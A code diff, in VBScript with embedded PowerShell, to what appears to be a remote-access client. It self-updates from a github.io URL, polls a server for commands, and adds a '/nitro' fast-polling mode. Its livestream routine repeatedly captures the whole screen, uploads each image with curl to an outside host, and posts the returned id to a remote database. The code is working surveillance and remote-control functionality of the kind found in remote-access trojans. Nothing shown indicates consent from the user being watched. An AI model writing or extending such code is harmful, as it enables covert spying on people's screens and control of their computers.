@@ -8,7 +8,7 @@ Dim WshShell, WshNetwork, FSO
 Dim logFilePath 
 
 ' --- AUTO UPDATE LOGIC ---
-Dim CURRENT_VERSION : CURRENT_VERSION = "v1.6"
+Dim CURRENT_VERSION : CURRENT_VERSION = "v1.7"
 Dim VERSION_URL : VERSION_URL = "https://logise1.github.io/cmd/version.txt"
 Dim UPDATE_URL : UPDATE_URL = "https://logise1.github.io/cmd/client10.vbs"
 
@@ -75,6 +75,9 @@ lastCommandId = ""
 
 Dim isLivestreamActive : isLivestreamActive = False
 Dim lastLivestreamSync : lastLivestreamSync = 0
+
+Dim isNitroActive : isNitroActive = False
+Dim lastNitroSync : lastNitroSync = 0
 
 ' --- Ejecución Principal ---
 LogWrite "Chequeando actualizaciones..."
@@ -194,6 +197,7 @@ Sub RunScript()
 End Sub
 
 Sub MainLoop()
+    Dim currentPoll
     Do
         On Error Resume Next
         If isLivestreamActive Then
@@ -204,7 +208,17 @@ Sub MainLoop()
             End If
         End If
 
-        WScript.Sleep POLL_MS
+        currentPoll = 5000
+        If isNitroActive Then
+            If DateDiff("s", lastNitroSync, Now()) > 30 Then
+                isNitroActive = False
+                LogWrite "Timeout: Nitro desactivado por inactividad"
+            Else
+                currentPoll = 1000
+            End If
+        End If
+
+        WScript.Sleep currentPoll
         UpdateHeartbeat GetEpochTime()
         CheckCommand
         If Err.Number <> 0 Then
@@ -512,11 +526,10 @@ Sub CheckCommand()
         isLivestreamActive = False
         WriteResponse cmdId, "LIVESTREAM DETENIDO"
 
-    ElseIf Left(trimmedCmdLower, 10) = "/pollrate " Then
-        Dim newPollRate : newPollRate = CLng(Mid(trimmedCmdLower, 11))
-        If newPollRate < 100 Then newPollRate = 100
-        POLL_MS = newPollRate
-        WriteResponse cmdId, "INTERVALO DE COMANDOS AJUSTADO A " & POLL_MS & "ms"
+    ElseIf trimmedCmdLower = "/nitro" Then
+        isNitroActive = True
+        lastNitroSync = Now()
+        WriteResponse cmdId, "MODO NITRO ACTIVADO (1s)"
 
     ElseIf Left(trimmedCmdLower, 7) = "/upload" AND InStr(trimmedCmdLower, " > ") > 0 Then
         ' ... (Código de Upload igual que antes) ...
@@ -595,6 +608,7 @@ Sub StartLivestreamAsync(hostId, delayMs)
     Dim scriptCode
     scriptCode = "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; " & _
                  "$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen; " & _
+                 "$fbUrl = '" & fbUrl & "'; " & _
                  "while($true) { " & _
                  "  try { " & _
                  "    $bmp = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height; " & _
@@ -603,13 +617,14 @@ Sub StartLivestreamAsync(hostId, delayMs)
                  "    $tmp = [System.IO.Path]::GetTempFileName() + '.jpg'; " & _
                  "    $bmp.Save($tmp, [System.Drawing.Imaging.ImageFormat]::Jpeg); " & _
                  "    $bmp.Dispose(); $gfx.Dispose(); " & _
-                 "    $res = curl.exe -s -X POST https://greenbase.arielcapdevila.com/upload -F ""file=@$tmp""; " & _
+                 "    $cargs = @('-s', '-X', 'POST', 'https://greenbase.arielcapdevila.com/upload', '-F', ""file=@$tmp""); " & _
+                 "    $res = & curl.exe @cargs | Out-String; " & _
                  "    Remove-Item -Force $tmp -ErrorAction SilentlyContinue; " & _
-                 "    if($res -match '""id"":\s*""([^""]+)""') { " & _
+                 "    if($res -match '""id""\s*:\s*""([^""]+)""') { " & _
                  "        $id = $matches[1]; " & _
                  "        $ts = [Math]::Floor([decimal](Get-Date (Get-Date).ToUniversalTime() -UFormat '%s')); " & _
-                 "        $json = '{""id"":""live_""+$ts,""data"":""gb:'+ $id +'"",""timestamp"":'+$ts+'}'; " & _
-                 "        curl.exe -s -X PUT -H ""Content-Type: application/json"" -d $json """ & fbUrl & """; " & _
+                 "        $json = '{""id"":""live_' + $ts + '"",""data"":""gb:'+ $id +'"",""timestamp"":'+$ts+'}'; " & _
+                 "        Invoke-RestMethod -Uri $fbUrl -Method Put -Body $json -ContentType 'application/json' -ErrorAction SilentlyContinue; " & _
                  "    } " & _
                  "  } catch {} " & _
                  "  Start-Sleep -Milliseconds " & delayMs & "; " & _
